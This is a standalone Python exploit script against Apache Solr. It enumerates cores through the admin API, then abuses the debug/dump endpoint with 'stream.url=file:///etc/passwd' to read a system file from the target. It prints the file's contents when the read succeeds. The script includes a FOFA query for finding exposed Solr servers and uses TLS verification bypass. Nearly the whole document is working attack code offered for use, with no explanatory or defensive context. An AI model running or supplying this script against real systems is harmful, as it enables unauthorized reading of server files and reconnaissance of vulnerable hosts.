#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import re

def title():
    print('+          FOFA: app="Apache-Solr"')

def run_core(core_url):
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        response = requests.get(url=core_url, headers=headers, verify=False, timeout=6)
        core_name = list(json.loads(response.text)["status"])[0]
        print('core_name{}'.format(core_name))
        return core_name
    except Exception as e:
        return False

def run_proto(url):
    core_url = url + "/solr/admin/cores?indexInfo=false&wt=json"
    if run_core(core_url):
        core_name = run_core(core_url)
    else:
        return False
    Vuln_url = url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    data = r'stream.url=file:///etc/passwd'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=Vuln_url, headers=headers, data=data, verify=False, timeout=10)
        reC = re.search(':.*?:.*?:/bin', response.text, re.I).group()
        if reC in response.text:
            print(response.text)
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

